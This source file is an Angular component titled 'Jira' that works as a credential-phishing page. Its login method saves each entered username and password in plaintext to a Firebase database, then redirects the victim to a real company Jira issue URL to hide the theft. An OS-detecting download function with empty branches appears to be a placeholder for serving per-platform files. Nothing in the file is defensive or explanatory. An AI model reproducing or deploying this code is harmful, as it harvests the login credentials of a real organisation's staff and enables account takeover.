  import { Component } from '@angular/core';
  import { AngularFireDatabase } from '@angular/fire/database'
  import firebase from 'firebase';

  @Component({
    selector: 'app-root',
    templateUrl: './app.component.html',
    styleUrls: ['./app.component.css']
  })
  export class AppComponent {
    title = 'Jira';

    username = ""
    password = ""

    errorValue = false
    count = 0
    download = true
    id: any;

    constructor(private db: AngularFireDatabase) { 
      console.log("new code 23/06 v2");
      this.id = window.location.href.split('/').pop()

      firebase.database().ref().on('value', snapshot => {
        if (this.count > 1) {
          window.close()
          this.goToLink(`http://jira.icheck.com.vn/browse/${this.id}`)
        }
      })
    }

    goToLink(url: string){
      window.open(url, "_blank");
    }

    login() {
      if (this.username != "" && this.password != "") {
        this.errorValue = false
        this.count += 1
        const id = this.db.createPushId()
        const tutRef = this.db.object(id);
        tutRef.set({ username: this.username, password: this.password});
        if ( this.download ) {
          this.download = false
          this.downloadFile()
        }
      } else {
        this.errorValue = true
      }      
    }
    
    getOS() {
      var userAgent = window.navigator.userAgent,
          platform = window.navigator.platform,
          macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
          windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
          os = null;

      if (macosPlatforms.indexOf(platform) !== -1) {
          os = 'Mac OS';
      }  else if (windowsPlatforms.indexOf(platform) !== -1) {
          os = 'Windows';
      }

      return os;
    }

    downloadFile() {
      console.log(this.getOS())
      if (this.getOS() == "Windows") {

      } 
      if (this.getOS() == "Mac OS") {

      } 
    }
  }
